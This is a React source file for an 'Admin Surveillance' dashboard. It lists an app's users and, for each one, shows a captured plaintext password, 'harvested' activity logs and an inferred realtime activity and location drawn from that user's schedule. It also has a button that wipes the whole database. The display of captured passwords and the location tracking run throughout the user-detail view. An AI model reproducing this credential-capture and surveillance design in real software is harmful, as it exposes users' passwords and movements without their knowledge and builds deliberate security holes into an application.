import React, { useEffect, useState } from 'react';
import { useNavigate } from 'react-router-dom';

function AdminPage() {
  const [users, setUsers] = useState([]);
  const [events, setEvents] = useState([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState('');
  const [selectedUser, setSelectedUser] = useState(null);

  const navigate = useNavigate();

  const fetchData = async () => {
    try {
      const token = localStorage.getItem('userToken');
      const response = await fetch('http://localhost:8080/api/admin/data', {
        headers: { 'Authorization': `Bearer ${token}` }
      });

      if (!response.ok) throw new Error('Failed to fetch admin data');

      const data = await response.json();
      setUsers(data.users);
      setEvents(data.events);
      setLoading(false);
    } catch (err) {
      setError(err.message);
      setLoading(false);
    }
  };

  useEffect(() => { fetchData(); }, []);

  const handleReset = async () => {
    if (!window.confirm("Are you sure? This will wipe the entire database.")) return;
    const token = localStorage.getItem('userToken');
    try {
        await fetch('http://localhost:8080/api/admin/reset', {
            method: 'DELETE',
            headers: { 'Authorization': `Bearer ${token}` }
        });
        localStorage.clear();
        navigate('/');
        window.location.reload();
    } catch (err) { alert("Error resetting DB"); }
  };

  const getUserEvents = (uid) => {
    return events
        .filter(e => e.userId === uid)
        .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
  };

  const reconstructSchedule = (user) => {
    if (!user.placements) return {};
    
    const schedule = {};
    const userEvents = getUserEvents(user.uid); 

    Object.entries(user.placements).forEach(([itemId, slotId]) => {
        const creationLog = userEvents.find(e => 
            (e.eventType === 'TASK_CREATED' || e.eventType === 'TASK_SCHEDULED') && 
            e.eventData && (e.eventData.itemId === itemId || e.eventData.name === itemId) 
        );
        
        let name = "Activity";
        let location = "";

        if (itemId.startsWith('work')) { 
            name = "Work"; 
            location = "Office"; 
        } else if (itemId.startsWith('hobby')) { 
            name = "Hobby"; 
            const hobbyIndex = parseInt(itemId.split('-')[1]);
            if (user.initialPreferences && user.initialPreferences.hobbies && user.initialPreferences.hobbies[hobbyIndex]) {
                name = user.initialPreferences.hobbies[hobbyIndex].name;
                location = user.initialPreferences.hobbies[hobbyIndex].location;
            }
        } else if (creationLog && creationLog.eventData) {
            name = creationLog.eventData.name || "Custom Task";
            location = creationLog.eventData.location || "";
        }

        schedule[slotId] = { name, location };
    });

    return schedule;
  };

  const getCurrentStatus = (schedule) => {
    const days = ["Sun", "Mon", "Tue", "Wed", "Thu", "Fri", "Sat"];
    const now = new Date();
    const currentDay = days[now.getDay()];
    const currentHour = now.getHours();

    const slotKey = `${currentDay}-${currentHour}`;
    const activity = schedule[slotKey];

    if (activity) {
        return { 
            status: "BUSY", 
            activity: activity.name, 
            location: activity.location || "Unknown" 
        };
    }
    
    if (currentHour >= 9 && currentHour < 17 && currentDay !== "Sat" && currentDay !== "Sun") {
        return { status: "IDLE", activity: "Nothing planned (Work Hours)", location: "-" };
    }

    return { status: "FREE", activity: "Free Time", location: "Home?" };
  };

  const analyzeTime = (schedule) => {
    let workCount = 0;
    let sportCount = 0;
    let totalScheduled = 0;

    Object.values(schedule).forEach(item => {
        totalScheduled++;
        const name = item.name.toLowerCase();
        if (name.includes('work') || name.includes('werk')) workCount++;
        if (name.includes('gym') || name.includes('sport') || name.includes('tennis') || name.includes('fitness')) sportCount++;
    });

    return { workCount, sportCount, totalScheduled };
  };

  const renderUserDetail = () => {
    if (!selectedUser) return null;

    const userLog = getUserEvents(selectedUser.uid);
    const schedule = reconstructSchedule(selectedUser);
    const currentStatus = getCurrentStatus(schedule);
    const stats = analyzeTime(schedule);

    return (
      <div style={styles.modalOverlay} onClick={() => setSelectedUser(null)}>
        <div style={styles.modalContent} onClick={(e) => e.stopPropagation()}>
          
          <div style={styles.modalHeader}>
            <h2>User Insight: {selectedUser.email}</h2>
            <button onClick={() => setSelectedUser(null)} style={styles.closeBtn}>X</button>
          </div>

          <div style={{
              background: currentStatus.status === 'BUSY' ? '#ffebee' : '#e8f5e9',
              border: `1px solid ${currentStatus.status === 'BUSY' ? '#ef9a9a' : '#a5d6a7'}`,
              padding: '15px', borderRadius: '8px', marginBottom: '20px',
              display: 'flex', alignItems: 'center', justifyContent: 'space-between'
          }}>
             <div>
                <strong style={{textTransform:'uppercase', color: '#555', fontSize:'0.8rem'}}>Current Realtime Status</strong>
                <div style={{fontSize:'1.2rem', fontWeight:'bold'}}>
                    {currentStatus.status === 'BUSY' ? '🔴 Active' : '🟢 Idle / Free'}
                </div>
             </div>
             <div style={{textAlign:'right'}}>
                 <div style={{fontSize:'1.1rem'}}>{currentStatus.activity}</div>
                 {currentStatus.location && <div style={{color:'#666'}}>📍 {currentStatus.location}</div>}
             </div>
          </div>

          <div style={styles.gridTwoColumns}>
            
            <div style={styles.card}>
              <h3>👤 Profile & Analysis</h3>
              <p><strong>Password:</strong> {selectedUser.unsafePassword === "Not captured yet" ? <span style={{color:'gray'}}>Waiting...</span> : <span style={styles.pwdBadge}>{selectedUser.unsafePassword}</span>}</p>
              
              <h4 style={{marginTop:'15px', borderTop:'1px solid #eee', paddingTop:'10px'}}>Week Breakdown</h4>
              <ul style={{listStyle:'none', padding:0}}>
                  <li style={styles.statRow}><span>🏢 Work:</span> <strong>{stats.workCount} hours</strong></li>
                  <li style={styles.statRow}><span>💪 Sport:</span> <strong>{stats.sportCount} hours</strong></li>
                  <li style={styles.statRow}><span>📅 Total Planned:</span> <strong>{stats.totalScheduled} hours</strong></li>
                  <li style={styles.statRow}><span>🆓 Unaccounted:</span> <strong>{105 - stats.totalScheduled} hours</strong></li>
              </ul>
            </div>

            <div style={styles.card}>
              <h3>🕵️‍♂️ Harvested Logs</h3>
              <div style={styles.logBox}>
                {userLog.slice(0, 15).map((log, index) => (
                  <div key={index} style={styles.logItem}>
                    <span style={styles.logTime}>{new Date(log.timestamp).toLocaleTimeString()}</span>
                    <span style={styles.logType}>{log.eventType}</span>
                    {log.eventData && log.eventData.name && <span style={{color:'#fff'}}> {log.eventData.name}</span>}
                    {log.eventData && log.eventData.location && <span style={{color:'#ffff00'}}> @ {log.eventData.location}</span>}
                  </div>
                ))}
              </div>
            </div>

          </div>
        </div>
      </div>
    );
  };

  if (loading) return <div>Loading...</div>;
  if (error) return <div>Error: {error}</div>;

  return (
    <div style={{ padding: "20px", maxWidth: "1200px", margin: "0 auto" }}>
      <div style={{display: 'flex', justifyContent: 'space-between', marginBottom: '20px'}}>
        <h1>👮‍♂️ Admin Surveillance</h1>
        <button onClick={handleReset} style={styles.resetBtn}>⚠️ Reset All</button>
      </div>

      <div style={{overflowX: 'auto', background: 'white', borderRadius: '8px', boxShadow: '0 2px 5px rgba(0,0,0,0.1)'}}>
        <table style={{ width: "100%", borderCollapse: "collapse" }}>
          <thead>
            <tr style={{ background: "#f4f4f4", textAlign: "left" }}>
              <th style={styles.th}>Email</th>
              <th style={styles.th}>Role</th>
              <th style={styles.th}>Last Activity</th>
              <th style={styles.th}>Actions</th>
            </tr>
          </thead>
          <tbody>
            {users.map((user) => (
              <tr key={user._id} style={{ borderBottom: "1px solid #eee" }}>
                <td style={styles.td}>{user.email}</td>
                <td style={styles.td}>{user.role}</td>
                <td style={styles.td}>{getUserEvents(user.uid)[0] ? new Date(getUserEvents(user.uid)[0].timestamp).toLocaleDateString() : '-'}</td>
                <td style={styles.td}>
                    <button onClick={() => setSelectedUser(user)} style={styles.viewBtn}>🔍 Monitor</button>
                </td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>
      {renderUserDetail()}
    </div>
  );
}

const styles = {
  th: { padding: "12px", borderBottom: "2px solid #ddd" },
  td: { padding: "12px" },
  resetBtn: { backgroundColor: '#c62828', color: 'white', border: 'none', padding: '10px 20px', borderRadius: '8px', cursor: 'pointer' },
  viewBtn: { backgroundColor: '#2196F3', color: 'white', border: 'none', padding: '6px 12px', borderRadius: '4px', cursor: 'pointer' },
  modalOverlay: { position: 'fixed', top: 0, left: 0, right: 0, bottom: 0, backgroundColor: 'rgba(0,0,0,0.6)', display: 'flex', justifyContent: 'center', alignItems: 'center', zIndex: 1000 },
  modalContent: { background: 'white', width: '90%', maxWidth: '900px', borderRadius: '10px', padding: '20px', maxHeight: '90vh', overflowY: 'auto' },
  modalHeader: { display: 'flex', justifyContent: 'space-between', marginBottom: '20px' },
  closeBtn: { background: 'none', border: 'none', fontSize: '1.5rem', cursor: 'pointer' },
  gridTwoColumns: { display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '20px' },
  card: { background: '#f9f9f9', padding: '15px', borderRadius: '8px' },
  logBox: { background: '#222', color: '#0f0', padding: '10px', borderRadius: '5px', maxHeight: '300px', overflowY: 'auto', fontFamily: 'monospace', fontSize: '0.85rem' },
  logItem: { marginBottom: '5px', borderBottom: '1px solid #444' },
  logTime: { color: '#888', marginRight: '10px' },
  logType: { fontWeight: 'bold', color: '#03a9f4', marginRight: '5px' },
  pwdBadge: { backgroundColor: '#ffebee', color: '#c62828', padding: '2px 5px', border: '1px solid #c62828', borderRadius: '4px', fontWeight: 'bold', fontFamily: 'monospace' },
  statRow: { display: 'flex', justifyContent: 'space-between', padding: '5px 0', borderBottom: '1px solid #eee' }
};

export default AdminPage;